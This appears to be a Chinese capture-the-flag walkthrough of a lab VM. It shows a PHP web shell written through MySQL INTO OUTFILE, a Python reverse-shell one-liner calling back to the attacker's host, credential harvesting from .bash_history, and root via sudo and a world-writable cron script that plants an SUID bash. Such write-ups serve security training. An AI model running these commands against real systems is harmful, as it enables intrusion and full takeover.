Linux red.initech 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:34:49 UTC 2016 i686 athlon i686 GNU/Linux
 12:29:36 up  1:18,  0 users,  load average: 0.01, 0.03, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## MySQL 写shell

先使用 elly 用户名与 ylle 口令登录 FTP 服务，下载 Apache 配置文件 apache2/sites-available/default-ssl.conf 文件后，发现其 HTTPS 服务的根路径为 **/var/www/https**

具体请参考：

> [How To Create a Self-Signed SSL Certificate for Apache in Ubuntu 18.04](https://www.digitalocean.com/community/tutorials/how-to-create-a-self-signed-ssl-certificate-for-apache-in-ubuntu-18-04)

```bash
ftp> cd apache2
250 Directory successfully changed.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0            7114 Jun 03  2016 apache2.conf
drwxr-xr-x    2 0        0            4096 Jun 04  2016 conf-available
drwxr-xr-x    2 0        0            4096 Jun 04  2016 conf-enabled
-rw-r--r--    1 0        0            1782 Mar 19  2016 envvars
-rw-r--r--    1 0        0           31063 Mar 19  2016 magic
drwxr-xr-x    2 0        0           12288 Jun 03  2016 mods-available
drwxr-xr-x    2 0        0            4096 Jun 03  2016 mods-enabled
-rw-r--r--    1 0        0             327 Jun 03  2016 ports.conf
drwxr-xr-x    2 0        0            4096 Jun 05  2016 sites-available
drwxr-xr-x    2 0        0            4096 Jun 04  2016 sites-enabled
226 Directory send OK.
ftp> cd sites-available
250 Directory successfully changed.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0            1332 Mar 19  2016 000-default.conf
-rw-r--r--    1 0        0            6339 Jun 05  2016 default-ssl.conf
226 Directory send OK.
ftp> get default-ssl.conf
local: default-ssl.conf remote: default-ssl.conf
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for default-ssl.conf (6339 bytes).
100% |*****************************************************************************************************************|  6339       50.37 MiB/s    00:00 ETA
226 Transfer complete.
6339 bytes received in 00:00 (9.62 MiB/s)
```

```bash
┌──(root💀kali)-[~]
└─# cat default-ssl.conf | grep Document
                DocumentRoot /var/www/https
                ErrorDocument 400 /custom_400.html
```

再root登录mysql写shell

```bash
└─# mysql -h192.168.0.100 -uroot -pplbkac
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 273
Server version: 5.7.12-0ubuntu1 (Ubuntu)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]> use mysql;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MySQL [mysql]> SELECT "<?php system($_GET['cmd']); ?>" into outfile "/var/www/https/blogblog/wp-content/uploads/exec.php";
Query OK, 1 row affected (0.001 sec)
```

<img src=".\图片\Snipaste_2023-06-22_11-45-51.png" alt="Snipaste_2023-06-22_11-45-51" style="zoom:80%;" />

接着通过 `cmd` 参数传入 Python 反弹 shell

```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.0.103",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

```bash
┌──(root💀kali)-[~/attack]
└─# nc -lvvp 1234            
listening on [any] 1234 ...
connect to [192.168.0.103] from 192.168.0.100 [192.168.0.100] 48420
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

# 权限提升

如上 www 权限的 shell，先来个交互 shell

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

## Sudo 提权

获取靶机 shell 环境后，首先从各个用户的 .bash_history 命令操作日志着手，搜索其中有价值的信息。

打印出日志后，发现两条包含了用户名与口令的 ssh 连接命令，其中 **JKanode 用户的口令为 thisimypassword，peter 用户的口令为 JZQuyIN5**：

```bash
www-data@red:/var/www/https/blogblog/wp-content/uploads$ cat /home/*/.bash_history | grep -v exit
</blogblog/wp-content/uploads$ cat /home/*/.bash_history | grep -v exit      
free
id
whoami
ls -lah
pwd
ps aux
sshpass -p thisimypassword ssh JKanode@localhost
apt-get install sshpass
sshpass -p JZQuyIN5 peter@localhost
ps -ef
top
kill -9 3747
whoami
id
top
ps aux
cat: /home/peter/.bash_history: Permission denied
top
```

经验证，JKanode 与 peter 用户均能登录成功，其中 peter 用户会返回一个 zsh，按下 `q` 退出其配置初始化过程后，执行 `whoami && id` 命令查看用户信息，发现 **peter 用户拥有 sudo 用户组权限**

```bash
www-data@red:/var/www/https/blogblog/wp-content/uploads$ ssh peter@192.168.0.100
</blogblog/wp-content/uploads$ ssh peter@192.168.0.100                       
Could not create directory '/var/www/.ssh'.
The authenticity of host '192.168.0.100 (192.168.0.100)' can't be established.
ECDSA key fingerprint is SHA256:WuY26BwbaoIOawwEIZRaZGve4JZFaRo7iSvLNoCwyfA.
Are you sure you want to continue connecting (yes/no)? yes
yes
Failed to add the host to the list of known hosts (/var/www/.ssh/known_hosts).
-----------------------------------------------------------------
~          Barry, don't forget to put a message here           ~
-----------------------------------------------------------------
peter@192.168.0.100's password: JZQuyIN5

Welcome back!


This is the Z Shell configuration function for new users,
zsh-newuser-install.
You are seeing this message because you have no zsh startup files
(the files .zshenv, .zprofile, .zshrc, .zlogin in the directory
~).  This function can help you with a few settings that should
make your use of the shell easier.

You can:

(q)  Quit and do nothing.  The function will be run again next time.

(0)  Exit, creating the file ~/.zshrc containing just a comment.
     That will prevent this function being run again.

(1)  Continue to the main menu.

(2)  Populate your ~/.zshrc with the configuration recommended
     by the system administrator and exit (you will need to edit
     the file by hand, if so desired).

--- Type one of the keys in parentheses --- q
q^J
red%                                                                           
red% id                                                                        
id
uid=1000(peter) gid=1000(peter) groups=1000(peter),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare)
```

执行 `sudo -l` 命令并输入密码，发现 peter 用户的 sudo 权限为 **(ALL : ALL) ALL**，表示 peter 用户可以在任何主机上，以任意用户的身份执行任意命令，具体请参考：

> [linux详解sudoers](https://www.cnblogs.com/jing99/p/9323080.html)

最后执行 `sudo su - root` 命令，即可获得 root 用户权限

```bash
red% sudo su                                                                   
sudo su
➜  peter cd /root                                                              
cd /root
➜  peter id                                                                    
id
uid=0(root) gid=0(root) groups=0(root)
➜  ~ ls                                                                        
ls
fix-wordpress.sh  flag.txt  issue  python.sh  wordpress.sql
➜  ~ cat flag.txt                                                              
cat flag.txt
~~~~~~~~~~<(Congratulations)>~~~~~~~~~~
                          .-'''''-.
                          |'-----'|
                          |-.....-|
                          |       |
                          |       |
         _,._             |       |
    __.o`   o`"-.         |       |
 .-O o `"-.o   O )_,._    |       |
( o   O  o )--.-"`O   o"-.`'-----'`
 '--------'  (   o  O    o)  
              `----------`
b6b545dc11b7a270f4bad23432190c75162c4a2b

```

## 计划任务提权

获取靶机 shell 环境后，还可以查看 cron 计划任务，搜索其中有价值的信息。

打印 cron 计划任务文件列表，发现若干可疑文件：

```bash
ls -alh /etc/*cron*
```

```bash
www-data@red:/var/www/https/blogblog/wp-content/uploads$ ls -alh /etc/*cron*
ls -alh /etc/*cron*
-rw-r--r-- 1 root root  722 Apr  5  2016 /etc/crontab

/etc/cron.d:
total 32K
drwxr-xr-x   2 root root 4.0K Jun  3  2016 .
drwxr-xr-x 100 root root  12K Jun 22 12:55 ..
-rw-r--r--   1 root root  102 Jun  3  2016 .placeholder
-rw-r--r--   1 root root   56 Jun  3  2016 logrotate
-rw-r--r--   1 root root  589 Jul 16  2014 mdadm
-rw-r--r--   1 root root  670 Mar  1  2016 php

/etc/cron.daily:
total 56K
drwxr-xr-x   2 root root 4.0K Jun  3  2016 .
drwxr-xr-x 100 root root  12K Jun 22 12:55 ..
-rw-r--r--   1 root root  102 Apr  5  2016 .placeholder
-rwxr-xr-x   1 root root  539 Apr  5  2016 apache2
-rwxr-xr-x   1 root root  376 Mar 31  2016 apport
-rwxr-xr-x   1 root root  920 Apr  5  2016 apt-compat
-rwxr-xr-x   1 root root 1.6K Nov 26  2015 dpkg
-rwxr-xr-x   1 root root  372 May  6  2015 logrotate
-rwxr-xr-x   1 root root  539 Jul 16  2014 mdadm
-rwxr-xr-x   1 root root  249 Nov 12  2015 passwd
-rwxr-xr-x   1 root root  383 Mar  8  2016 samba
-rwxr-xr-x   1 root root  214 Apr 12  2016 update-notifier-common

/etc/cron.hourly:
total 20K
drwxr-xr-x   2 root root 4.0K Jun  3  2016 .
drwxr-xr-x 100 root root  12K Jun 22 12:55 ..
-rw-r--r--   1 root root  102 Apr  5  2016 .placeholder

/etc/cron.monthly:
total 20K
drwxr-xr-x   2 root root 4.0K Jun  3  2016 .
drwxr-xr-x 100 root root  12K Jun 22 12:55 ..
-rw-r--r--   1 root root  102 Apr  5  2016 .placeholder

/etc/cron.weekly:
total 28K
drwxr-xr-x   2 root root 4.0K Jun  3  2016 .
drwxr-xr-x 100 root root  12K Jun 22 12:55 ..
-rw-r--r--   1 root root  102 Apr  5  2016 .placeholder
-rwxr-xr-x   1 root root   86 Apr 13  2016 fstrim
-rwxr-xr-x   1 root root  211 Apr 12  2016 update-notifier-common
```

经过一番搜索，在 **/etc/cron.d/logrotate** 计划任务中，发现以 **root** 用户执行的 shell 脚本 **/usr/local/sbin/cron-logrotate.sh**，该脚本 5 分钟执行一次，但无实际任务执行。

此外，脚本权限为 **`-rwxrwxrwx`\**，说明\**任何用户可在此设置计划任务，并以 root 用户权限执行**

```bash
www-data@red:/var/www/https/blogblog/wp-content/uploads$ cat /etc/cron.d/logrotate
</blogblog/wp-content/uploads$ cat /etc/cron.d/logrotate                     
*/5 *   * * *   root  /usr/local/sbin/cron-logrotate.sh
www-data@red:/var/www/https/blogblog/wp-content/uploads$ ls -alh /usr/local/sbin/cron-logrotate.sh
</blogblog/wp-content/uploads$ ls -alh /usr/local/sbin/cron-logrotate.sh     
-rwxrwxrwx 1 root root 51 Jun  3  2016 /usr/local/sbin/cron-logrotate.sh
```

接下来设置计划任务，将 /bin/bash 文件复制为 **/tmp/getroot** 文件，将其属主改为 **`root:root`** ，并赋予 SUID 权限 **`-rwsr-xr-x`** ：

```bash
echo "cp /bin/bash /tmp/getroot; chown root:root /tmp/getroot; chmod u+s /tmp/getroot" >> /usr/local/sbin/cron-logrotate.sh
```

等待 5 分钟后，触发计划任务执行，发现 /tmp/getroot 文件创建成功，并且其属主与权限均符合预期。

最后执行 `/tmp/getroot -p` 命令，能够以 root 用户权限启动 bash，即可获得 root 用户的命令执行环境：

```bash
www-data@red:/tmp$ ./getroot -p
./getroot -p
getroot-4.3# id
id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
getroot-4.3# cat /root/flag.txt
cat /root/flag.txt
~~~~~~~~~~<(Congratulations)>~~~~~~~~~~
                          .-'''''-.
                          |'-----'|
                          |-.....-|
                          |       |
                          |       |
         _,._             |       |
    __.o`   o`"-.         |       |
 .-O o `"-.o   O )_,._    |       |
( o   O  o )--.-"`O   o"-.`'-----'`
 '--------'  (   o  O    o)  
              `----------`
b6b545dc11b7a270f4bad23432190c75162c4a2b
```

## CVE-2016-4557 内核漏洞提权

获取靶机 shell 环境后，查看系统内核与发行版相关信息。结果显示，靶机系统内核版本为 **4.4.0-21-generic**，发行版为 **Ubuntu 16.04 LTS**：

```
uname -a
cat /proc/version
lsb_release -a
```

在 searchsploit 寻找利用即可

针对 Ubuntu 16.04 LTS 发行版，使用 searchsploit 工具搜索相关漏洞利用脚本。结果显示，**Linux Kernel 4.4.x 内核存在[本地权限提升漏洞（EDB-ID 39772）](https://www.exploit-db.com/exploits/39772)** ，并将其 EXP 说明文档复制到当前目录：

```bash
searchsploit ubuntu 16.04 privilege escalation
searchsploit -m 39772
```

...........这里就不做了

# 总结

鸟瞰全局式的打法，对于各个端口有不同的方式，利用一些可能的方法，尽量搜集一些**用户名密码**之类的信息，再把其做成字典

对于 ftp 与 smb 的打法有了更深入的理解 

对于 WordPress 就用 wpscan 来扫描，有没有相关插件有的已知的漏洞，或者本身版本就有漏洞

拿到一定权限后，可以看看一些其它用户执行过的**历史命令记录**

enum4linux 可以枚举一些本地的用户名 ，配合 hydra 爆破


